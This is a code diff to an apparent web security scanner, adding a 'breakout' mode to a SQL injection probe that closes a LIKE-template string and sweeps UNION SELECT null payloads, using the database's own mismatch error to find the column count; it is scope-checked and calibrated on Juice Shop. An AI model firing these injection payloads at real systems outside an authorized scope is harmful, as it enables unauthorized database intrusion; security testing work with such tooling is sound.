@@ -3816,6 +3816,7 @@ async def sqli_probe(target: str, param: str, method: str = "GET",
                      context: str = "value", placement: str = "param",
                      name: str | None = None, oob: bool = False,
                      time_based: bool = False, waf_bypass: bool = False,
+                     breakout: bool = False,
                      multibyte: bool = False, delay_s: float = 5.0,
                      oast_token: str | None = None, wait: float = 3.0) -> dict:
     """**SQL injection** probe — non-destructive, differential. Core: a single-quote
@@ -3825,8 +3826,12 @@ async def sqli_probe(target: str, param: str, method: str = "GET",
     `placement` = param|header|cookie (with `name`), `oob` (per-DBMS DNS/HTTP **OAST**
     callback — start `oast_selfhost` first), `time_based` (per-DBMS sleep, confirmed only
     when the delay is proportional to `delay_s`), `waf_bypass` (JSON-operator + comment
-    twins — flags SQLi reachable only when the plain boolean is blocked), `multibyte`
-    (Shift-JIS/EUC-KR/GBK lead-byte charset bypass). No data extraction (→ sqlmap).
+    twins — flags SQLi reachable only when the plain boolean is blocked), `breakout`
+    (LIKE/`%…%`-template params: close the string + parens and run the
+    **UNION-null-count sweep** — the error-feedback loop that finds the right-hand
+    column count from the engine's own mismatch message; Juice-Shop calibration
+    2026-10-29), `multibyte` (Shift-JIS/EUC-KR/GBK lead-byte charset bypass). No data
+    extraction (→ sqlmap).
     Intrusive; in scope only.
     """
 
@@ -3902,6 +3907,57 @@ async def sqli_probe(target: str, param: str, method: str = "GET",
                                "bypass": bool(wb) and not bool_diff}
         if wb:
             extra_hits.append("sqli/waf-bypass-encoding" if not bool_diff else "sqli/encoded-differential")
+
+    # --- breakout lane (LIKE-template params): close the string/parens, sweep the
+    # UNION-null count until the engine's mismatch signature goes quiet. The loop
+    # reads the engine's OWN error as feedback — the calibration loop that generic
+    # twins miss when the parameter is embedded as `'%{q}%' … )) ORDER BY …`.
+    if breakout:
+        marker = "SELECTs to the left and right of UNION"
+        counts: list[int] = []
+        resolved: int | None = None
+        first_ok_body = ""
+        async def _get_plain(value: str):
+            # Force a decompressable Accept-Encoding: the OPSEC/browser profile
+            # advertises `br` (+zstd) which the stdlib transport cannot decode —
+            # a brotli body would blind the marker match (Juice-Shop calibration:
+            # every 500 page arrived as \x1b5… brotli).
+            bu, bb = _with_param(url, param, value, m)
+            return await ctx.http.fetch(bu, method=m, body=bb,
+                                        headers={"Accept-Encoding": "gzip, deflate"},
+                                        follow_redirects=False, scope_check=_scope_check())
+        try:
+            for n in range(1, 25):
+                val = "')) union select " + ",".join(["null"] * n) + "--"
+                rr = await _get_plain(val)
+                body = rr.text(2000) if hasattr(rr, "text") else ""
+                if marker in body:
+                    counts.append(n)
+                    continue
+                if rr.status == 200:
+                    resolved = n
+                    first_ok_body = body[:120]
+                    break
+                # Odd 5xx (route/edge glitches — even a deterministic one at a
+                # single sweep index on Juice Shop): SKIP, do not abort the sweep.
+                continue
+        except Exception:
+            pass
+        lanes["like_breakout"] = {
+            "union_reachable": bool(counts),
+            "mismatch_column_counts": counts[:16],
+            "resolved_columns": resolved,
+            "sample": first_ok_body,
+            "payload_template": "')) union select {nulls} --",
+            "note": ("Right-side column count > sweep ceiling (24) or the app truncates the "
+                     "parameter (~200 chars) before the sweep can finish — a mismatch sweep "
+                     "stuck at its ceiling still proves the engine is reachable; extract "
+                     "data with sqlmap/external tooling.") if counts and resolved is None else "",
+        }
+        if counts:
+            extra_hits.append("sqli/union-error-based")
+            if resolved:
+                extra_hits.append("sqli/union-columns-resolved")
 
     # --- time-based blind lane (repeated samples + scaling re-probe) ---
     if time_based:
